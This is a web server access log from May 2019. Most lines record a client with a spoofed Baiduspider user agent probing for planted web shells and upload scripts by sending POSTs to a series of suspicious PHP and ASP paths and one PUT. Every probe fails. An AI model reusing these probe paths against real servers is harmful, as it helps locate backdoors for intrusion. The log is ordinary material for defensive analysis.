42.51.43.140 - - [17/May/2019:00:45:19 -0700] "GET /dayrui/libraries/tmp-upload-images/test9859.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
182.76.175.118 - - [17/May/2019:00:44:09 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 52114382 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
182.76.175.118 - - [17/May/2019:00:44:06 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 48611843 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
180.117.100.7 - - [17/May/2019:00:46:18 -0700] "POST ///test404.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:19 -0700] "POST ///php.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:19 -0700] "POST ///aa.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:20 -0700] "POST ///Config_Shell.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:20 -0700] "POST ///xxx.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:21 -0700] "POST ///Luna.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:22 -0700] "POST ///seo.asp HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:23 -0700] "POST ///images/uploadfile.asp HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:23 -0700] "POST ///90.asp HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:24 -0700] "POST ///indexa.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:24 -0700] "PUT //a597ZQ01C0OR8JzB.txt HTTP/1.1" 405 504 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:25 -0700] "POST ///Hzllaga.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:25 -0700] "POST ///css.asp HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:26 -0700] "POST ///you.aspx HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:26 -0700] "POST ///Templates/red.asp HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:27 -0700] "POST ///install/m7lrv.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:28 -0700] "POST ///config/AspCms_Config.asp HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:32 -0700] "POST ///php/include/include.helpers.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:32 -0700] "POST ///include/code/mp.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:33 -0700] "POST ///plus/guestbook/xx.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:35 -0700] "POST ///config/me.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
180.117.100.7 - - [17/May/2019:00:46:35 -0700] "POST ///e/news.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
